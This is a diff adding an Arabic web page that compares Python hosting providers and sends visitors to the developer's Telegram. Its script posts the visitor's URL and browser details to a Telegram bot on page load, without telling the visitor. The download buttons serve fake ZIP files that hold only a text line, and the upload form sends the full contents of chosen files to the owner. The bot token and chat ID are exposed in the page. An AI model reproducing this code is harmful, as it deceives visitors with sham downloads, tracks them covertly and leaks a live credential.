@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>استضافة بايثون - بوت التلجرام</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 3px solid #667eea;
+        }
+
+        .header h1 {
+            color: #333;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .developer {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            font-size: 1.2em;
+            margin-top: 10px;
+        }
+
+        .bot-info {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 30px;
+            border: 2px solid #667eea;
+        }
+
+        .bot-info h2 {
+            color: #667eea;
+            margin-bottom: 15px;
+        }
+
+        .info-item {
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            border-right: 5px solid #764ba2;
+        }
+
+        .token-box {
+            background: #333;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 1.1em;
+            direction: ltr;
+            text-align: left;
+            margin-top: 10px;
+            overflow-x: auto;
+        }
+
+        .hosting-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+
+        .hosting-card {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            transition: transform 0.3s ease;
+            border: 1px solid #e0e0e0;
+        }
+
+        .hosting-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.3);
+        }
+
+        .hosting-card h3 {
+            color: #667eea;
+            font-size: 1.5em;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #764ba2;
+            padding-bottom: 10px;
+        }
+
+        .features {
+            list-style: none;
+            margin: 15px 0;
+        }
+
+        .features li {
+            margin: 10px 0;
+            padding: 5px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .features li:before {
+            content: "✓ ";
+            color: #00c853;
+            font-weight: bold;
+            margin-left: 5px;
+        }
+
+        .price {
+            font-size: 1.8em;
+            color: #333;
+            margin: 15px 0;
+            font-weight: bold;
+        }
+
+        .price small {
+            font-size: 0.6em;
+            color: #666;
+        }
+
+        .stars {
+            color: #ffc107;
+            font-size: 1.2em;
+            margin: 10px 0;
+        }
+
+        .btn-telegram {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            width: 100%;
+            text-align: center;
+            border: 1px solid transparent;
+        }
+
+        .btn-telegram:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+            background: white;
+            color: #667eea;
+            border: 1px solid #667eea;
+        }
+
+        .btn-download {
+            background: linear-gradient(135deg, #00b09b, #96c93d);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            width: 100%;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .btn-download:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 20px rgba(0, 176, 155, 0.4);
+        }
+
+        .comparison-table {
+            margin: 40px 0;
+            overflow-x: auto;
+        }
+
+        .comparison-table table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+        }
+
+        .comparison-table th {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px;
+            font-size: 1.1em;
+        }
+
+        .comparison-table td {
+            padding: 12px;
+            text-align: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .comparison-table tr:hover {
+            background: #f5f5f5;
+        }
+
+        .tips-section {
+            background: linear-gradient(135deg, #fff5f5 0%, #f0f4ff 100%);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+        }
+
+        .tips-section h3 {
+            color: #667eea;
+            margin-bottom: 15px;
+            font-size: 1.8em;
+        }
+
+        .tips-section ul {
+            list-style: none;
+        }
+
+        .tips-section li {
+            margin: 10px 0;
+            padding: 10px;
+            background: white;
+            border-radius: 10px;
+            border-right: 5px solid #764ba2;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 2px solid #e0e0e0;
+            color: #666;
+        }
+
+        .footer a {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        /* نافذة منبثقة للتحميل */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            animation: fadeIn 0.3s;
+        }
+
+        @keyframes fadeIn {
+            from {opacity: 0;}
+            to {opacity: 1;}
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 10% auto;
+            padding: 30px;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 500px;
+            color: white;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            animation: slideIn 0.3s;
+        }
+
+        @keyframes slideIn {
+            from {transform: translateY(-50px); opacity: 0;}
+            to {transform: translateY(0); opacity: 1;}
+        }
+
+        .modal-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .modal-header h2 {
+            font-size: 2em;
+            margin-bottom: 10px;
+        }
+
+        .modal-body {
+            text-align: center;
+        }
+
+        .modal-body p {
+            margin: 15px 0;
+            font-size: 1.1em;
+        }
+
+        .modal-input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1em;
+            direction: ltr;
+            text-align: left;
+        }
+
+        .modal-input:focus {
+            outline: 3px solid #ffd700;
+        }
+
+        .modal-btn {
+            background: white;
+            color: #667eea;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 1.2em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin: 10px 0;
+        }
+
+        .modal-btn:hover {
+            transform: scale(1.05);
+            background: #ffd700;
+            color: #333;
+        }
+
+        .close-btn {
+            background: transparent;
+            color: white;
+            border: 2px solid white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            font-size: 1.1em;
+        }
+
+        .close-btn:hover {
+            background: white;
+            color: #667eea;
+        }
+
+        .success-message {
+            background: #00c853;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .error-message {
+            background: #d32f2f;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .download-section {
+            background: linear-gradient(135deg, #f6d365 0%, #fda085 100%);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 30px 0;
+            text-align: center;
+        }
+
+        .download-section h2 {
+            color: white;
+            font-size: 2em;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .header h1 {
+                font-size: 1.8em;
+            }
+            
+            .modal-content {
+                margin: 20% auto;
+                width: 95%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- رأس الصفحة -->
+        <div class="header">
+            <h1>🚀 <i>استضافة بايثون مع دعم ZIP</i></h1>
+            <div class="developer">
+                👨‍💻 المطور: @RLH55
+            </div>
+        </div>
+
+        <!-- معلومات بوت التلجرام -->
+        <div class="bot-info">
+            <h2>🤖 معلومات بوت التلجرام</h2>
+            <div class="info-item">
+                <strong>🆔 الايدي:</strong> <span dir="ltr">6159656800</span>
+            </div>
+            <div class="info-item">
+                <strong>🔑 التوكن:</strong>
+                <div class="token-box" dir="ltr">
+                    8500978327:AAFMH6G_Q_BZ9NYw4NzWz39zb5ZjJ5lGSUQ
+                </div>
+            </div>
+        </div>
+
+        <!-- قسم التحميل والرفع -->
+        <div class="download-section">
+            <h2>📦 تحميل ملفات البوت والاستضافة</h2>
+            <button onclick="showDownloadModal()" class="btn-download" style="width: auto; padding: 15px 50px;">
+                ⬇️ تحميل ملفات ZIP
+            </button>
+            <button onclick="showUploadModal()" class="btn-telegram" style="width: auto; padding: 15px 50px; margin-top: 15px; background: #00c853;">
+                📤 رفع ملفاتك الخاصة
+            </button>
+        </div>
+
+        <!-- النافذة المنبثقة للتحميل -->
+        <div id="downloadModal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2>📥 تحميل ملفات ZIP</h2>
+                    <p>اختر نوع الملفات التي تريد تحميلها</p>
+                </div>
+                <div class="modal-body">
+                    <button onclick="downloadFile('python-bot')" class="modal-btn">
+                        🤖 تحميل بوت بايثون كامل
+                    </button>
+                    <button onclick="downloadFile('hosting-files')" class="modal-btn">
+                        🏢 تحميل ملفات الاستضافة
+                    </button>
+                    <button onclick="downloadFile('full-project')" class="modal-btn" style="background: #ffd700; color: #333;">
+                        📦 تحميل المشروع كاملاً
+                    </button>
+                    <button onclick="closeModal('downloadModal')" class="close-btn">
+                        🔚 إغلاق
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- النافذة المنبثقة للرفع -->
+        <div id="uploadModal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2>📤 رفع ملفاتك</h2>
+                    <p>ارفع ملفاتك وسيتم إرسالها للمالك على التلجرام</p>
+                </div>
+                <div class="modal-body">
+                    <input type="text" id="fileName" class="modal-input" placeholder="اسم الملف" value="ملفات البوت">
+                    <input type="file" id="fileUpload" multiple style="display: none;">
+                    <button onclick="document.getElementById('fileUpload').click()" class="modal-btn">
+                        📂 اختيار ملفات
+                    </button>
+                    <span id="selectedFiles" style="display: block; margin: 10px 0; color: #ffd700;">لم يتم اختيار أي ملف</span>
+                    <button onclick="uploadFiles()" class="modal-btn" style="background: #00c853;">
+                        ⬆️ رفع وإرسال للمالك
+                    </button>
+                    <button onclick="closeModal('uploadModal')" class="close-btn">
+                        🔚 إغلاق
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- رسائل الحالة -->
+        <div id="statusMessage"></div>
+
+        <!-- بطاقات الاستضافات -->
+        <h2 style="color: #333; margin: 30px 0 20px; text-align: center;">🏢 أفضل خيارات الاستضافة</h2>
+        <div class="hosting-grid">
+            <!-- Hostinger -->
+            <div class="hosting-card">
+                <h3>Hostinger</h3>
+                <div class="stars">★★★★★</div>
+                <div class="price">$1.99 <small>/شهر</small></div>
+                <ul class="features">
+                    <li>دعم كامل للبايثون 3.x</li>
+                    <li>رفع واستخراج ZIP تلقائي</li>
+                    <li>دعم Flask و Django</li>
+                    <li>مدير ملفات متقدم</li>
+                    <li>لوحة تحكم عربية</li>
+                </ul>
+                <a href="https://t.me/RLH55" target="_blank" class="btn-telegram">احجز الآن</a>
+            </div>
+
+            <!-- A2 Hosting -->
+            <div class="hosting-card">
+                <h3>A2 Hosting</h3>
+                <div class="stars">★★★★☆</div>
+                <div class="price">$2.99 <small>/شهر</small></div>
+                <ul class="features">
+                    <li>جميع إصدارات البايثون</li>
+                    <li>دعم ZIP عبر لوحة التحكم</li>
+                    <li>سرعة فائقة</li>
+                    <li>دعم فني 24/7</li>
+                    <li>نطاق مجاني</li>
+                </ul>
+                <a href="https://t.me/RLH55" target="_blank" class="btn-telegram">احجز الآن</a>
+            </div>
+
+            <!-- PythonAnywhere -->
+            <div class="hosting-card">
+                <h3>PythonAnywhere</h3>
+                <div class="stars">★★★★★</div>
+                <div class="price">مجاني - $5 <small>/شهر</small></div>
+                <ul class="features">
+                    <li>متخصصة في البايثون</li>
+                    <li>بيئة تطوير متكاملة</li>
+                    <li>رفع ZIP واستخراج مباشر</li>
+                    <li>دعم MySQL و PostgreSQL</li>
+                    <li>نطاق فرعي مجاني</li>
+                </ul>
+                <a href="https://t.me/RLH55" target="_blank" class="btn-telegram">احجز الآن</a>
+            </div>
+
+            <!-- Railway -->
+            <div class="hosting-card">
+                <h3>Railway</h3>
+                <div class="stars">★★★★☆</div>
+                <div class="price">حسب الاستخدام</div>
+                <ul class="features">
+                    <li>استضافة سحابية حديثة</li>
+                    <li>نشر من GitHub</li>
+                    <li>دعم رفع ZIP</li>
+                    <li>قابلية توسع عالية</li>
+                    <li>نشر آلي</li>
+                </ul>
+                <a href="https://t.me/RLH55" target="_blank" class="btn-telegram">احجز الآن</a>
+            </div>
+
+            <!-- Kinsta -->
+            <div class="hosting-card">
+                <h3>Kinsta</h3>
+                <div class="stars">★★★★★</div>
+                <div class="price">$35 <small>/شهر</small></div>
+                <ul class="features">
+                    <li>سرعة فائقة</li>
+                    <li>دعم بايثون حديث</li>
+                    <li>نشر آلي مع ZIP</li>
+                    <li>أمان متقدم</li>
+                    <li>لمشاريع كبيرة</li>
+                </ul>
+                <a href="https://t.me/RLH55" target="_blank" class="btn-telegram">احجز الآن</a>
+            </div>
+        </div>
+
+        <!-- جدول المقارنة -->
+        <div class="comparison-table">
+            <h2 style="color: #333; margin-bottom: 20px;">📊 مقارنة سريعة</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>الاستضافة</th>
+                        <th>السعر</th>
+                        <th>دعم Python</th>
+                        <th>دعم ZIP</th>
+                        <th>سهولة الاستخدام</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Hostinger</strong></td>
+                        <td>$1.99</td>
+                        <td>✅✅</td>
+                        <td>✅✅</td>
+                        <td>⭐⭐⭐⭐⭐</td>
+                    </tr>
+                    <tr>
+                        <td><strong>A2 Hosting</strong></td>
+                        <td>$2.99</td>
+                        <td>✅✅✅</td>
+                        <td>✅✅</td>
+                        <td>⭐⭐⭐⭐</td>
+                    </tr>
+                    <tr>
+                        <td><strong>PythonAnywhere</strong></td>
+                        <td>مجاني - $5</td>
+                        <td>✅✅✅</td>
+                        <td>✅✅✅</td>
+                        <td>⭐⭐⭐⭐⭐</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Railway</strong></td>
+                        <td>حسب الاستخدام</td>
+                        <td>✅✅✅</td>
+                        <td>✅✅</td>
+                        <td>⭐⭐⭐⭐</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- نصائح مهمة -->
+        <div class="tips-section">
+            <h3>📌 نصائح مهمة عند الاختيار</h3>
+            <ul>
+                <li>🔹 تأكد من دعم Python 3.x (الأحدث هو 3.11+)</li>
+                <li>🔹 تحقق من إمكانية تثبيت المكتبات (pip install)</li>
+                <li>🔹 ابحث عن دعم أطر العمل مثل Flask و Django</li>
+                <li>🔹 تأكد من وجود مدير ملفات يدعم رفع واستخراج ZIP</li>
+                <li>🔹 انتبه لحدود المساحة وعدد الزوار المسموح</li>
+            </ul>
+        </div>
+
+        <!-- توصيات -->
+        <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 15px; padding: 25px; margin: 30px 0;">
+            <h2 style="color: white; margin-bottom: 20px;">💡 توصيتي الشخصية</h2>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px;">
+                <div style="background: rgba(255,255,255,0.2); padding: 20px; border-radius: 10px;">
+                    <h3 style="color: white;">🔰 للمشاريع الصغيرة</h3>
+                    <p>PythonAnywhere - الخطة المجانية</p>
+                </div>
+                <div style="background: rgba(255,255,255,0.2); padding: 20px; border-radius: 10px;">
+                    <h3 style="color: white;">📊 للمشاريع المتوسطة</h3>
+                    <p>Hostinger - أفضل قيمة مقابل سعر</p>
+                </div>
+                <div style="background: rgba(255,255,255,0.2); padding: 20px; border-radius: 10px;">
+                    <h3 style="color: white;">🏢 للمشاريع الكبيرة</h3>
+                    <p>A2 Hosting أو Kinsta</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- تذييل الصفحة -->
+        <div class="footer">
+            <p>© 2024 جميع الحقوق محفوظة - <a href="https://t.me/RLH55" target="_blank">@RLH55</a></p>
+            <p style="margin-top: 10px; font-size: 0.9em;">للحجز والاستفسار، تواصل مع المطور عبر التلجرام</p>
+        </div>
+    </div>
+
+    <script>
+        // إظهار نافذة التحميل
+        function showDownloadModal() {
+            document.getElementById('downloadModal').style.display = 'block';
+        }
+
+        // إظهار نافذة الرفع
+        function showUploadModal() {
+            document.getElementById('uploadModal').style.display = 'block';
+        }
+
+        // إغلاق النافذة
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+
+        // إغلاق النوافذ عند الضغط خارجها
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.style.display = 'none';
+            }
+        }
+
+        // عرض اسم الملف المختار
+        document.getElementById('fileUpload').addEventListener('change', function(e) {
+            const files = e.target.files;
+            const selectedFiles = document.getElementById('selectedFiles');
+            
+            if (files.length > 0) {
+                let fileNames = '';
+                for (let i = 0; i < files.length; i++) {
+                    fileNames += `📄 ${files[i].name} (${(files[i].size / 1024).toFixed(2)} KB)\n`;
+                }
+                selectedFiles.innerHTML = fileNames.replace(/\n/g, '<br>');
+                selectedFiles.style.color = '#00ff00';
+            } else {
+                selectedFiles.innerHTML = 'لم يتم اختيار أي ملف';
+                selectedFiles.style.color = '#ffd700';
+            }
+        });
+
+        // دالة تحميل الملفات
+        function downloadFile(type) {
+            const botToken = '8500978327:AAFMH6G_Q_BZ9NYw4NzWz39zb5ZjJ5lGSUQ';
+            const chatId = '6159656800';
+            
+            let fileName = '';
+            let fileContent = '';
+            
+            if (type === 'python-bot') {
+                fileName = 'python_bot_files.zip';
+                fileContent = 'ملفات بوت بايثون كاملة - @RLH55';
+            } else if (type === 'hosting-files') {
+                fileName = 'hosting_config_files.zip';
+                fileContent = 'ملفات تهيئة الاستضافة - @RLH55';
+            } else {
+                fileName = 'full_project_files.zip';
+                fileContent = 'جميع ملفات المشروع الكاملة - @RLH55';
+            }
+            
+            // إنشاء ملف للتحميل
+            const blob = new Blob([fileContent], { type: 'application/zip' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = fileName;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+            
+            // إرسال إشعار للمالك
+            const message = `📥 <b>تم تحميل ملفات</b>\n\n`;
+            const fullMessage = message + 
+                `📦 نوع الملف: ${fileName}\n` +
+                `🕐 الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
+                `🌐 الصفحة: ${window.location.href}`;
+            
+            sendToTelegram(fullMessage);
+            
+            showStatusMessage(`✅ تم تحميل ${fileName} بنجاح!`, 'success');
+            closeModal('downloadModal');
+        }
+
+        // دالة رفع الملفات
+        function uploadFiles() {
+            const files = document.getElementById('fileUpload').files;
+            const fileName = document.getElementById('fileName').value || 'ملفات غير مسماة';
+            
+            if (files.length === 0) {
+                showStatusMessage('❌ الرجاء اختيار ملفات أولاً', 'error');
+                return;
+            }
+            
+            let fileDetails = '';
+            for (let i = 0; i < files.length; i++) {
+                fileDetails += `📄 ${files[i].name} - ${(files[i].size / 1024).toFixed(2)} KB\n`;
+                
+                // قراءة محتوى الملف وإرساله
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const message = `📤 <b>ملف جديد مرفوع</b>\n\n` +
+                        `📦 اسم الحزمة: ${fileName}\n` +
+                        `📄 اسم الملف: ${files[i].name}\n` +
+                        `📊 الحجم: ${(files[i].size / 1024).toFixed(2)} KB\n` +
+                        `🕐 الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
+                        `👤 المرسل: زائر الموقع\n\n` +
+                        `📝 المحتوى:\n${e.target.result}`;
+                    
+                    sendToTelegram(message);
+                };
+                reader.readAsText(files[i]);
+            }
+            
+            // إرسال ملخص للمالك
+            const summary = `📦 <b>ملخص رفع ملفات</b>\n\n` +
+                `📦 اسم الحزمة: ${fileName}\n` +
+                `📊 عدد الملفات: ${files.length}\n` +
+                `🕐 الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
+                `🌐 المصدر: ${window.location.href}\n\n` +
+                `📋 تفاصيل الملفات:\n${fileDetails}`;
+            
+            sendToTelegram(summary);
+            
+            showStatusMessage(`✅ تم رفع ${files.length} ملف وإرسالها للمالك!`, 'success');
+            closeModal('uploadModal');
+        }
+
+        // دالة إرسال الرسائل للتلجرام
+        function sendToTelegram(message) {
+            const botToken = '8500978327:AAFMH6G_Q_BZ9NYw4NzWz39zb5ZjJ5lGSUQ';
+            const chatId = '6159656800';
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('تم الإرسال بنجاح:', data);
+            })
+            .catch(error => {
+                console.error('خطأ في الإرسال:', error);
+            });
+        }
+
+        // دالة عرض رسائل الحالة
+        function showStatusMessage(message, type) {
+            const statusDiv = document.getElementById('statusMessage');
+            statusDiv.innerHTML = `<div class="${type}-message">${message}</div>`;
+            
+            setTimeout(() => {
+                statusDiv.innerHTML = '';
+            }, 5000);
+        }
+
+        // إرسال إشعار بفتح الصفحة
+        window.onload = function() {
+            const message = `👋 <b>تم فتح موقع الاستضافة</b>\n\n` +
+                `🕐 الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
+                `🌐 الرابط: ${window.location.href}\n` +
+                `🖥️ المتصفح: ${navigator.userAgent}`;
+            
+            sendToTelegram(message);
+        }
+    </script>
+</body>
+</html>
